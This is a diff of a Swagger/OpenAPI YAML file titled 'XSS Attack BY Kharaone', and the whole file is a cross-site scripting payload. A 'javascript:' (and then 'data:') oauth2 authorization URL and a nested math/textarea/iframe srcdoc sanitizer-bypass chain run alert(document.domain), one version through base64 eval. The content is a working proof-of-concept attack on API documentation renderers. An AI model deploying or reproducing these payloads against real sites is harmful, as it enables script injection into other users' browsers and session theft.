@@ -4,11 +4,11 @@ securityDefinitions:
     type: basic
   a:
     type: oauth2
-    authorizationUrl: javascript:alert(document.domain)//
+    authorizationUrl: data:alert(document.domain)//
 info:
   title: XSS Attack BY Kharaone
   description: |
-    <math><mtext><option><FAKEFAKE><option></option><mglyph><svg><mtext><mtext><textarea><desc id="</textarea><math><mtext><!--"><textarea id="--><iframe srcdoc="<script><script>eval(atob(YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ==)</script>">
+    <math><mtext><option><FAKEFAKE><option></option><mglyph><svg><mtext><mtext><textarea><desc id="</textarea><math><mtext><!--"><textarea id="--><iframe srcdoc="<script><script>alert(document.domain)</script>">
 
   version: production
 basePath: /JSSResource/
